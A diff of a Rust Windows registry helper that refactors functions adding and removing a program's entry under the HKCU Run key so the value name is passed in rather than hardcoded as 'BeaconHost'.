@@ -221,7 +221,7 @@ pub fn write_string(name: &str, val: &str) -> bool {
 }
 
 #[cfg(windows)]
-pub fn write_startup(exe_path: &str, args: &str) -> bool {
+pub fn write_startup(name: &str, exe_path: &str, args: &str) -> bool {
     unsafe {
         let mut hkey: isize = 0;
         let startup_subkey_w = to_wide("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
@@ -235,7 +235,7 @@ pub fn write_startup(exe_path: &str, args: &str) -> bool {
         {
             return false;
         }
-        let name_w = to_wide("BeaconHost");
+        let name_w = to_wide(name);
         let val = format!("\"{}\" {}", exe_path, args);
         let val_w = to_wide(&val);
         let res = RegSetValueExW(
@@ -252,7 +252,7 @@ pub fn write_startup(exe_path: &str, args: &str) -> bool {
 }
 
 #[cfg(windows)]
-pub fn delete_startup() -> bool {
+pub fn delete_startup(name: &str) -> bool {
     unsafe {
         let mut hkey: isize = 0;
         let startup_subkey_w = to_wide("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
@@ -266,7 +266,7 @@ pub fn delete_startup() -> bool {
         {
             return false;
         }
-        let name_w = to_wide("BeaconHost");
+        let name_w = to_wide(name);
         #[link(name = "advapi32")]
         extern "system" {
             fn RegDeleteValueW(hkey: isize, lpvaluename: *const u16) -> i32;
@@ -321,11 +321,11 @@ pub fn write_string(_name: &str, _val: &str) -> bool {
     false
 }
 #[cfg(not(windows))]
-pub fn write_startup(_exe_path: &str, _args: &str) -> bool {
+pub fn write_startup(_name: &str, _exe_path: &str, _args: &str) -> bool {
     false
 }
 #[cfg(not(windows))]
-pub fn delete_startup() -> bool {
+pub fn delete_startup(_name: &str) -> bool {
     false
 }
 #[cfg(not(windows))]
